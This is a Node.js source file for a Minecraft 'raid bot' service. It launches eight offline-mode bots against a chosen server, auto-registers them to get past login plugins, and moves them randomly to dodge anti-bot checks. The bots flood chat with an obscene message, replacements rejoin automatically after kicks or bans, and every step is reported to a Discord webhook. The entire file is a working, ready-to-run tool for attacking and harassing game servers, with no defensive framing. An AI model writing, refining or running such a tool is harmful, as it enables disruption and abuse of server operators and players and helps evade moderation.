const express = require('express');
const mineflayer = require('mineflayer');

// Render Web Service Uptime
const app = express();
const PORT = process.env.PORT || 8080;

app.get('/', (req, res) => {
    res.send('Minecraft Raid Bot Service is Active & Running!');
});

app.listen(PORT, () => {
    console.log(`[+] Web server listening on port ${PORT}`);
});

// ---------------- ENVIRONMENT CONFIGURATION ----------------
const SERVER_IP = process.env.SERVER_IP || '127.0.0.1';
const SERVER_PORT = parseInt(process.env.SERVER_PORT || '25565');
const PASSWORD = process.env.BOT_PASSWORD || 'RaidPass123';
const BASE_BOT_NAME = process.env.BOT_NAME || 'RaidBot';
const WEBHOOK_URL = process.env.WEBHOOK_URL || ''; // Discord Webhook URL

const TOTAL_BOTS = 8;
const MESSAGE_LIMIT = 50;
const MESSAGE_INTERVAL = 3000;
const COOLDOWN_TIME = 5 * 60 * 1000;

let activeBots = [];
let isRunning = true; // Always active to keep trying to join/reconnect

// Discord Webhook par logs bhejne ka function
async function sendWebhook(title, description, color = 3447003) {
    if (!WEBHOOK_URL) {
        console.error('[-] ERROR: WEBHOOK_URL environment variable set nahi hai!');
        throw new Error('WEBHOOK_URL is missing!');
    }

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: title,
                    description: description,
                    color: color,
                    timestamp: new Date().toISOString()
                }]
            })
        });

        if (!response.ok) {
            console.error(`[-] Webhook Error: Server responded with status ${response.status}`);
        }
    } catch (error) {
        console.error('[-] Webhook Failed to Send:', error.message);
    }
}

// Ek single bot ko create karne aur auto-reconnect/replace handle karne ka function
function spawnSingleBot() {
    if (!isRunning) return;

    const username = `${BASE_BOT_NAME}_${Math.floor(Math.random() * 9000 + 1000)}`;
    
    const bot = mineflayer.createBot({
        host: SERVER_IP,
        port: SERVER_PORT,
        username: username,
        auth: 'offline',
        brand: 'vanilla'
    });

    activeBots.push(bot);

    bot.on('spawn', () => {
        const successMsg = `[+] Bot **${username}** successfully server par join ho gaya hai!`;
        console.log(successMsg);
        sendWebhook('🟢 Bot Connected', successMsg, 3066993).catch(() => {});

        // AuthMe / Login Plugin Bypass
        setTimeout(() => {
            if (!isRunning) return;
            bot.chat(`/register ${PASSWORD} ${PASSWORD}`);
            setTimeout(() => {
                if (!isRunning) return;
                bot.chat(`/login ${PASSWORD}`);
            }, 2000);
        }, 3000);

        // Anti-Bot bypass movement (5s walk/jump -> 3s stop)
        function startMovement() {
            if (!isRunning) return;
            bot.setControlState('forward', true);
            bot.setControlState('jump', Math.random() > 0.5);
            const randomYaw = Math.random() * Math.PI * 2;
            bot.look(randomYaw, 0, true);

            setTimeout(() => {
                if (!isRunning) return;
                bot.setControlState('forward', false);
                bot.setControlState('jump', false);

                setTimeout(() => {
                    startMovement();
                }, 3000);
            }, 5000);
        }

        setTimeout(startMovement, 4000);

        // Chat Spamming Logic (50 messages per bot -> 5m cooldown)
        let messageCount = 0;
        const spamInterval = setInterval(() => {
            if (!isRunning) {
                clearInterval(spamInterval);
                return;
            }

            if (messageCount >= MESSAGE_LIMIT) {
                const limitMsg = `[*] Bot **${username}** ne 50 messages bhej diye hain. 5 min cooldown shuru...`;
                console.log(limitMsg);
                sendWebhook('⏳ Cooldown Active', limitMsg, 16776960).catch(() => {});
                clearInterval(spamInterval);
                
                setTimeout(() => {
                    if (isRunning) {
                        messageCount = 0;
                    }
                }, COOLDOWN_TIME);
                return;
            }

            bot.chat('Server And Ur Mom Fukxed by spyer.lol');
            messageCount++;
            console.log(`[💬] (${username}) Message sent: DDOS RAIDED BY UNKNOW (${messageCount}/${MESSAGE_LIMIT})`);
        }, MESSAGE_INTERVAL);

        bot.on('end', () => {
            clearInterval(spamInterval);
        });
    });

    bot.on('kicked', (reason) => {
        const kickMsg = `[-] Bot **${username}** kick/ban ho gaya! Reason: ${reason}`;
        console.log(kickMsg);
        sendWebhook('🔴 Bot Kicked / Banned', kickMsg, 15158332).catch(() => {});
        cleanupAndReplace(bot);
    });

    bot.on('error', (err) => {
        const errorMsg = `[-] Bot **${username}** Connection/Server Error: ${err.message}`;
        console.log(errorMsg);
        sendWebhook('⚠️ Bot Error / Offline', errorMsg, 15158332).catch(() => {});
        cleanupAndReplace(bot);
    });
}

// Cleanup and replace disconnected/kicked bots
function cleanupAndReplace(botInstance) {
    const idx = activeBots.indexOf(botInstance);
    if (idx !== -1) {
        activeBots.splice(idx, 1);
    }

    if (isRunning) {
        console.log(`[!] Connection lost. 5 seconds mein reconnect try hoga.`);
        setTimeout(() => {
            if (isRunning) {
                spawnSingleBot();
            }
        }, 5000);
    }
}

// Background loop to maintain exact TOTAL_BOTS count and reconnect if server comes back online
function maintainBotsLoop() {
    setInterval(() => {
        if (!isRunning) return;
        
        if (activeBots.length < TOTAL_BOTS) {
            const needed = TOTAL_BOTS - activeBots.length;
            console.log(`[*] Server online check: ${needed} bots ko dubara join karwaya ja raha hai...`);
            for (let i = 0; i < needed; i++) {
                setTimeout(() => {
                    spawnSingleBot();
                }, i * 2000);
            }
        }
    }, 10000);
}

// Initial Launch
function startRaidBots() {
    console.log(`[*] ${TOTAL_BOTS} bots ko auto-spawn aur continuous monitor par lagaya ja raha hai...`);
    sendWebhook('🚀 Raid Bot Service Started', `Target Server: \`${SERVER_IP}:${SERVER_PORT}\`. Bots are continuously trying to connect/stay online.`, 3447003).catch(() => {});

    for (let i = 0; i < TOTAL_BOTS; i++) {
        setTimeout(() => {
            if (!isRunning) return;
            spawnSingleBot();
        }, i * 2000);
    }

    maintainBotsLoop();
}

// Boot up
setTimeout(() => {
    startRaidBots();
}, 2000);
